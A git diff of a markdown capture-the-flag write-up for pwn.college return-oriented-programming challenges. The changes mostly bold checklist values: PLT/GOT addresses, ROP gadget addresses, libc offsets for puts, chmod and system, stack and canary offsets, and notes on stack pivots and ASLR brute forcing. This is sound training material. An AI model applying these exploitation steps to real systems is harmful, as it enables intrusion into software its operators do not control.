+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150f0`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Address of `_start()`
@@ -7759,12 +7759,12 @@ pwndbg> info address _start
 Symbol "_start" is at 0x4011d0 in a file compiled without debugging.
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150f0`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401120`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150f0`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4011d0`
+- [x] Address of `_start()`: **`0x4011d0`**
 
 #### ROP gadgets
 
@@ -7908,15 +7908,15 @@ Gadgets information
 Unique gadgets found: 130
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150f0`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401120`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150f0`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x4023f3`
-   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
-   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
-- [x] Address of `_start()`: `0x4011d0`
+   - `pop rdi ; ret`: **`0x4023f3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x4023f1`**
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: **`0x4023ed`**
+- [x] Address of `_start()`: **`0x4011d0`**
 
 #### Libc functions
 
@@ -7939,17 +7939,17 @@ hacker@return-oriented-programming~pivotal-prelude-easy:/$ readelf -s /lib/x86_6
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x401120` 
-- [x] Location of the GOT entry of `puts@got`: `0x405028`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16`
+- [x] Location of the PLT entry of `puts@plt`: **`0x401120`**
+- [x] Location of the GOT entry of `puts@got`: **`0x405028`**
+- [x] Location of the unexecuted ROP chain within BSS: **`0x4150f0`**
 - [x] Offsets of required Libc functions
-   - Offset of the `puts` symbol within Libc: `0x84420`
-   - Offset of the `chmod` symbol within Libc: `0x10dd80`   
+   - Offset of the `puts` symbol within Libc: **`0x84420`**
+   - Offset of the `chmod` symbol within Libc: **`0x10dd80`**   
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x4023f3`
-   - `pop rsi ; pop r15 ; ret`: `0x4023f1`
-   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x4023ed`
-- [x] Address of `_start()`: `0x4011d0`
+   - `pop rdi ; ret`: **`0x4023f3`**
+   - `pop rsi ; pop r15 ; ret`: **`0x4023f1`**
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: **`0x4023ed`**
+- [x] Address of `_start()`: **`0x4011d0`**
 
 
 ### ROP chain: Stack pivot + ret2libc
@@ -8606,7 +8606,7 @@ hacker@return-oriented-programming~pivotal-prelude-hard:/$ objdump -d /challenge
 00000000004010a0 <puts@plt>:
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
 - [ ] Location of the GOT entry of `puts@got`
 - [ ] Location of the ROP chain within BSS
 - [ ] Offsets of required Libc functions
@@ -8620,8 +8620,8 @@ hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -r /challenge
 000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
+- [x] Location of the GOT entry of `puts@got`: **`0x404020`**
 - [ ] Location of the ROP chain within BSS
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
@@ -8636,12 +8636,12 @@ pwndbg> info address _start
 Symbol "_start" is at 0x4010f0 in a file compiled without debugging.
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
+- [x] Location of the GOT entry of `puts@got`: **`0x404020`**
 - [ ] Location of the ROP chain within BSS
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
-- [x] Address of `_start()`: `0x4010f0`
+- [x] Address of `_start()`: **`0x4010f0`**
 
 #### ROP gadgets
 
@@ -8733,15 +8733,15 @@ Gadgets information
 Unique gadgets found: 78
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
+- [x] Location of the GOT entry of `puts@got`: **`0x404020`**
 - [ ] Location of the ROP chain within BSS
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets:
-   - `pop rdi ; ret`: `0x401413`
-   - `pop rsi ; pop r15 ; ret`: `0x401411`
-   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
-- [x] Address of `_start()`: `0x4010f0`
+   - `pop rdi ; ret`: **`0x401413`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401411`**
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: **`0x40140d`**
+- [x] Address of `_start()`: **`0x4010f0`**
 
 #### Libc functions
 
@@ -8764,17 +8764,17 @@ hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -s /lib/x86_6
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
+- [x] Location of the GOT entry of `puts@got`: **`0x404020`**
 - [ ] Location of the ROP chain within BSS
 - [x] Offsets of required Libc functions:
-   - Offset of the `puts` symbol within Libc: `0x84420`
-   - Offset of the `chmod` symbol within Libc: `0x10dd80`
+   - Offset of the `puts` symbol within Libc: **`0x84420`**
+   - Offset of the `chmod` symbol within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets:
-   - `pop rdi ; ret`: `0x401413`
-   - `pop rsi ; pop r15 ; ret`: `0x401411`
-   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
-- [x] Address of `_start()`: `0x4010f0`
+   - `pop rdi ; ret`: **`0x401413`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401411`**
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: **`0x40140d`**
+- [x] Address of `_start()`: **`0x4010f0`**
 
 #### `challenge()`
 
@@ -8886,17 +8886,17 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 We can see the location in the BSS within the `dest` parameter and also in the `rsi` register.
 
-- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020`
-- [x] Location of the ROP chain within BSS: `0x414080 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
+- [x] Location of the PLT entry of `puts@plt`: **`0x4010a0`**
+- [x] Location of the GOT entry of `puts@got`: **`0x404020`**
+- [x] Location of the ROP chain within BSS: **`0x414080 + 16` = `0x414090`** (Because we do not want to execute the first two gadgets again in the BSS.)
 - [x] Offsets of required Libc functions:
-   - Offset of the `puts` symbol within Libc: `0x84420`
-   - Offset of the `chmod` symbol within Libc: `0x10dd80`
+   - Offset of the `puts` symbol within Libc: **`0x84420`**
+   - Offset of the `chmod` symbol within Libc: **`0x10dd80`**
 - [x] Locations of required ROP gadgets:
-   - `pop rdi ; ret`: `0x401413`
-   - `pop rsi ; pop r15 ; ret`: `0x401411`
-   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
-- [x] Address of `_start()`: `0x4010f0`
+   - `pop rdi ; ret`: **`0x401413`**
+   - `pop rsi ; pop r15 ; ret`: **`0x401411`**
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: **`0x40140d`**
+- [x] Address of `_start()`: **`0x4010f0`**
 
 ### ROP chain: Stack pivot + ret2libc
 
@@ -9043,7 +9043,7 @@ Since location of the pointer to `win()` is before our buffer, we will have to p
 
 We need the following:
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-- [ ] Locations of required ROP gadgets
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 ### Binary Analysis
@@ -9293,8 +9293,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-   - Location of the buffer: `0x7fff122d4e08`
-- [ ] Locations of required ROP gadgets
+   - Location of the buffer: **`0x7fff122d4e08`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Let's get the location of the stored return pointer, and calculate the offset.
@@ -9316,9 +9316,9 @@ $1 = 112
 ```
 
 - [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
-   - Location of the buffer: `0x7fff122d4e08`
-   - Location of stored return pointer: `0x7fff122d4e78`
-- [ ] Locations of required ROP gadgets
+   - Location of the buffer: **`0x7fff122d4e08`**
+   - Location of stored return pointer: **`0x7fff122d4e78`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 #### ROP gadgets
@@ -9372,18 +9372,18 @@ This is because the address are always `0x1000` aligned. So, if we went with the
    - Location of the buffer: `0x7fff122d4e08`
    - Location of stored return pointer: `0x7fff122d4e78`
 - [x] LSB of required ROP gadgets:
-   - `leave ; ret`: `\xb2`
+   - `leave ; ret`: **`\xb2`**
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
 We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. This will be clear when looking at the ROP chain.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
-   - Location of the buffer: `0x7fff122d4e08`
-   - Location of stored return pointer: `0x7fff122d4e78`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`112`**
+   - Location of the buffer: **`0x7fff122d4e08`**
+   - Location of stored return pointer: **`0x7fff122d4e78`**
 - [x] LSB of required ROP gadgets:
-   - `leave ; ret`: `\xb2`
-- [x] Offset of the overwritten stored base pointer value from the buffer: `0x7fff122d4e70 - 16`
+   - `leave ; ret`: **`\xb2`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`0x7fff122d4e70 - 16` = `0x7fff122d4e60`**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -9583,7 +9583,7 @@ hacker@return-oriented-programming~pivotal-pointer-hard:/$ /challenge/pivotal-po
 Requirements for crafting a successful exploit:
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-- [ ] Locations of required ROP gadgets
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 ### Binary Analysis
@@ -9723,8 +9723,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-   - Location of the buffer: `0x7ffe74b2f618`
-- [ ] Locations of required ROP gadgets
+   - Location of the buffer: **`0x7ffe74b2f618`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Let's get the location of the stored return pointer, and calculate the offset.
@@ -9745,10 +9745,10 @@ pwndbg> p/d 0x7ffe74b2f678 - 0x7ffe74b2f618
 $1 = 96
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
-   - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer: `0x7ffe74b2f678`
-- [ ] Locations of required ROP gadgets
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`96`**
+   - Location of the buffer: **`0x7ffe74b2f618`**
+   - Location of the stored return pointer: **`0x7ffe74b2f678`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 #### ROP gadgets
@@ -9798,21 +9798,21 @@ This is because the address are always `0x1000` aligned. So, if we went with the
 
 We have the following information now:
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
-   - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer: `0x7ffe74b2f678`
-- [x] Locations of required ROP gadgets
-   - `leave ; ret`: `\x47`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`96`**
+   - Location of the buffer: **`0x7ffe74b2f618`**
+   - Location of the stored return pointer: **`0x7ffe74b2f678`**
+- [x] LSB of required ROP gadgets
+   - `leave ; ret`: **`\x47`**
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
-   - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer: `0x7ffe74b2f678`
-- [x] Locations of required ROP gadgets
-   - `leave ; ret`: `\x47`
-- [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffe74b2f670 - 16`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`96`**
+   - Location of the buffer: **`0x7ffe74b2f618`**
+   - Location of the stored return pointer: **`0x7ffe74b2f678`**
+- [x] LSB of required ROP gadgets
+   - `leave ; ret`: **`\x47`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`0x7ffe74b2f670 - 16` = `0x7ffe74b2f660`**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -9882,7 +9882,7 @@ Since location of the pointer to `win()` is before our buffer, we will have to p
 
 We need the following:
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-- [ ] Locations of required ROP gadgets
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 ### Binary Analysis
@@ -10131,8 +10131,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-   - Location of the buffer: `0x7ffe4e08de08`
-- [ ] Locations of required ROP gadgets
+   - Location of the buffer: **`0x7ffe4e08de08`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Let's get the location of the stored return pointer, and calculate the offset.
@@ -10153,10 +10153,10 @@ pwndbg> p/d 0x7ffe4e08de88 - 0x7ffe4e08de08
 $1 = 128
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
-   - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer: `0x7ffe4e08de88`
-- [ ] Locations of required ROP gadgets
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`128`**
+   - Location of the buffer: **`0x7ffe4e08de08`**
+   - Location of stored return pointer: **`0x7ffe4e08de88`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 #### ROP gadgets
@@ -10206,23 +10206,23 @@ So, if we use the `leave ; ret` gadget present in `main()` we will only have to 
 
 This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
-   - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer: `0x7ffe4e08de88`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`128`**
+   - Location of the buffer: **`0x7ffe4e08de08`**
+   - Location of stored return pointer: **`0x7ffe4e08de88`**
 - [x] LSB of required ROP gadgets:
-   - `leave ; ret`: `\x86`
+   - `leave ; ret`: **`\x86`**
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
 We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. `0x7ffe4e08ddf8` is the value being popped into `rbp`, and after `pop rbp`, `rsp` advances to `de00` where `win()` lives.
 This will be clear when looking at the ROP chain.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
-   - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer: `0x7ffe4e08de88`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`128`**
+   - Location of the buffer: **`0x7ffe4e08de08`**
+   - Location of stored return pointer: **`0x7ffe4e08de88`**
 - [x] LSB of required ROP gadgets:
-   - `leave ; ret`: `\x86`
-- [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffe4e08de80 - 16`
+   - `leave ; ret`: **`\x86`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`0x7ffe4e08de80 - 16` = `0x7ffe4e08de70`**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -10422,7 +10422,7 @@ hacker@return-oriented-programming~pivotal-payload-hard:~$ /challenge/pivotal-pa
 Requirements for crafting a successful exploit:
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-- [ ] Locations of required ROP gadgets
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 ### Binary Analysis
@@ -10558,8 +10558,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
-   - Location of the buffer: `0x7ffcacefda58`
-- [ ] Locations of required ROP gadgets
+   - Location of the buffer: **`0x7ffcacefda58`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Let's get the location of the stored return pointer, and calculate the offset.
@@ -10580,10 +10580,10 @@ pwndbg> p/d 0x7ffcacefda88 - 0x7ffcacefda58
 $1 = 48
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
-   - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer: `0x7ffcacefda88`
-- [ ] Locations of required ROP gadgets
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`48`**
+   - Location of the buffer: **`0x7ffcacefda58`**
+   - Location of the stored return pointer: **`0x7ffcacefda88`**
+- [ ] LSB of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 #### ROP gadgets
@@ -10633,21 +10633,21 @@ This is because the address are always `0x1000` aligned. See [here](https://writ
 
 We have the following information now:
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
-   - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer: `0x7ffcacefda88`
-- [x] Locations of required ROP gadgets
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`48`**
+   - Location of the buffer: **`0x7ffcacefda58`**
+   - Location of the stored return pointer: **`0x7ffcacefda88`**
+- [x] LSB of required ROP gadgets
    - `leave ; ret`: `\xbb`
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
-   - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer: `0x7ffcacefda88`
-- [x] Locations of required ROP gadgets
-   - `leave ; ret`: `\xbb`
-- [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffcacefda80 - 16`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`48`**
+   - Location of the buffer: **`0x7ffcacefda58`**
+   - Location of the stored return pointer: **`0x7ffcacefda88`**
+- [x] LSB of required ROP gadgets
+   - `leave ; ret`: **`\xbb`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`0x7ffcacefda80 - 16` = `0x7ffcacefda70`**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -11031,7 +11031,7 @@ Breakpoint hit at 0x64b6f3eb9207
 ```
 
 - [x] Offset between the location of the buffer and the location of the stored return pointer: 
-   - Location of the buffer: `0x7ffedfb5b0f8`
+   - Location of the buffer: **`0x7ffedfb5b0f8`**
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -11051,9 +11051,9 @@ pwndbg> p/d 0x7ffedfb5b168 - 0x7ffedfb5b0f8
 $1 = 112
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
-   - Location of the buffer: `0x7ffedfb5b0f8`
-   - Location of the saved return pointer: `0x7ffedfb5b168`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`112`**
+   - Location of the buffer: **`0x7ffedfb5b0f8`**
+   - Location of the saved return pointer: **`0x7ffedfb5b168`**
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -11141,11 +11141,12 @@ A **2-byte** overwrite locks byte 2 of the resulting address to `0x3e` (the curr
 
 ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
-   - Location of the buffer: `0x7ffedfb5b0f8`
-   - Location of the saved return pointer: `0x7ffedfb5b168`
-- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
-- [x] Offset of the overwritten stored base pointer value from the buffer: `104` (we write `buf - 16`)
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`112`**
+   - Location of the buffer: **`0x7ffedfb5b0f8`**
+   - Location of the saved return pointer: **`0x7ffedfb5b168`**
+- [x] Locations of required ROP gadgets: 
+   - `leave ; ret`: **at libc offset `0x578c8`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`104` (we write `buf - 16`)**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -11340,7 +11341,7 @@ Since location of the pointer to `win()` is before our buffer, we will have to p
 We need the following:
 
 - [ ] Offset between the location of the buffer and the location of the stored return pointer
-- [ ] LSB of required ROP gadgets
+- [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 ### Binary Analysis
@@ -11538,9 +11539,9 @@ pwndbg> p/d 0x7ffdc2d2b1e8 - 0x7ffdc2d2b198
 $1 = 80
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
-   - Location of the buffer: `0x7ffdc2d2b198`
-   - Location of the stored return pointer: `0x7ffdc2d2b1e8`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`80`**
+   - Location of the buffer: **`0x7ffdc2d2b198`**
+   - Location of the stored return pointer: **`0x7ffdc2d2b1e8`**
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -11602,11 +11603,12 @@ A **2-byte** overwrite locks byte 2 of the resulting address to `0xcc` (the curr
 
 ASLR randomizes 28 bits of the libc base (bits 12–39). Since the base is always page-aligned (low 12 bits = `0x000`), the lower nibble of byte 1 of any libc gadget address is always `0x0`. This leaves **4 bits (upper nibble of byte 1) × 8 bits (byte 2) = 4096 possible 3-byte patterns** to enumerate.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer: `80`
-   - Location of the buffer: `0x7ffdc2d2b198`
-   - Location of the stored return pointer: `0x7ffdc2d2b1e8`
-- [x] Locations of required ROP gadgets: `leave ; ret` at libc offset `0x578c8` → 4096-way brute force
-- [x] Offset of the overwritten stored base pointer value from the buffer: `72` (we write `buf - 16`)
+- [x] Offset between the location of the buffer and the location of the stored return pointer: **`80`**
+   - Location of the buffer: **`0x7ffdc2d2b198`**
+   - Location of the stored return pointer: **`0x7ffdc2d2b1e8`**
+- [x] Locations of required ROP gadgets: 
+   - `leave ; ret` **at libc offset `0x578c8`**
+- [x] Offset of the overwritten stored base pointer value from the buffer: **`72`**
 
 ### ROP chain: Stack pivot + ret2win
 
@@ -11984,9 +11986,9 @@ Breakpoint hit at 0x5e1c69bd94b3
 ```
 
 - [ ] Offset between buffer and stack canary
-   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the buffer: **`0x7ffe0e9228a0`**
 - [ ] Offset between buffer and stored return address
-   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the buffer: **`0x7ffe0e9228a0`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12010,12 +12012,12 @@ pwndbg> p/d 0x7ffe0e9228f8 - 0x7ffe0e9228a0
 $2 = 88
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffe0e9228f8`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the canary: **`0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the stored return address: **`0x7ffe0e9228f8`**
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12036,16 +12038,16 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /l
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffe0e9228f8`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the canary: **`0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the stored return address: **`0x7ffe0e9228f8`**
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 ### Libc functions
 
@@ -12056,17 +12058,17 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
   1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffe0e9228f8`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the canary: **`0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the stored return address: **`0x7ffe0e9228f8`**
 - [ ] Offsets of required Libc functions
-   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `system()` within Libc: **`0x52290`**
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - `pop rdi ; ret`: **`0x23b6a`**
+   - `pop rsi ; ret`: **`0x2601f`**
 
 Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
 
@@ -12078,18 +12080,18 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stack canary: `72`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address: `0x7ffe0e9228f8`
+- [x] Offset between buffer and stack canary: **`72`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the canary: **`0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`**
+- [x] Offset between buffer and stored return address: **`88`**
+   - Location of the buffer: **`0x7ffe0e9228a0`**
+   - Location of the stored return address: **`0x7ffe0e9228f8`**
 - [x] Offsets of required Libc functions
